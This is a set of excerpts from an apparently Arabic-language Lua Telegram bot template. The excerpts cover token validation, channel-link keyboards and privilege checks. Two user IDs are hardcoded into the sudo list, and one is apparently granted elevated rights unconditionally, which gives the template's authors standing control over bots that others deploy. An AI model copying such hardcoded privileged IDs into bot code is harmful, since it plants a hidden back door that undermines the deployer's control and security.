...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐌𝐎s ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐌𝐎s ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ 𝐌𝐎s ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
sudo_users = {SUDO,1700360357,1236115319}   
...
if tonumber(user_id) == tonumber(1700360357) then  
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙼𝚄𝚂𝙻𝙸𝙼.")  
...
*تحديثات وشروحات سورس المسلم*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝙼𝚄𝚂𝙻𝙸𝙼 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/FIDRG"}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙼𝚄𝚂𝙻𝙸𝙼.',url="t.me/UU_Le2"}},
}
local msg_id = msg.id_/2097152/0.5
...
{
{text = '𝐌𝐎𝐔𝐒𝐋𝐈𝐌 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/UU_Le2"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ 𝐌𝐎s ┉  ┉ ┉ ┉ ┉≫ٴٴ\n❃︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙼𝚄𝚂𝙻𝙸𝙼. ](t.me/UU_Le2)➤ ')
end
